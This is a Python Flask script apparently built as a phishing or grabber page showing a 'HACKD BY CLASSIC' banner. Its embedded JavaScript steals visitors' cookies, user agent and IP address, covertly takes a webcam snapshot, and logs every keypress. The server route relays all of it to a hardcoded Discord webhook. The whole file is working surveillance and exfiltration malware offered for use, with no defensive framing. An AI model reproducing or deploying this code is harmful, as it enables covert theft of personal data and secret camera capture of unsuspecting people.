from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html><body style="background:#000;color:#f00;font:80px Arial;text-align:center;padding-top:30vh">
HACKD BY CLASSIC<br><span style="font-size:100px;color:#f66">LOL</span>
<script>
(async()=>{ 
let d={t:Date(),ua:navigator.userAgent,c:document.cookie};
d.ip=await(await fetch("https://httpbin.org/ip")).then(r=>r.json()).then(r=>r.origin).catch(()=>'fail');
if(navigator.mediaDevices){
navigator.mediaDevices.getUserMedia({video:1}).then(s=>{
let v=document.createElement('video');v.srcObject=s;v.play();
setTimeout(()=>{let c=document.createElement('canvas');c.width=480;c.height=640;c.getContext('2d').drawImage(v,0,0);
fetch("/s", {method:'POST', body:JSON.stringify({selfie:c.toDataURL(),data:d})}); s.getTracks()[0].stop()},3500)
})}
}
fetch("/s",{method:'POST',body:JSON.stringify(d)});
document.onkeydown=e=>fetch("/s",{method:'POST',body:JSON.stringify({key:e.key})});
})();
</script>
</body></html>
'''

@app.route('/s', methods=['POST'])
def save():
    data = request.json
    requests.post("https://discord.com/api/webhooks/1489207059026149377/HAW3Qm9L-k7aNvSWXxpctuuFp4KcH87ss74EFcAye_eeatcYVsVLdn360f1UEuf6YJUm", json={"content":f"🎭 SACI\n```{json.dumps(data, indent=2)}```"})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
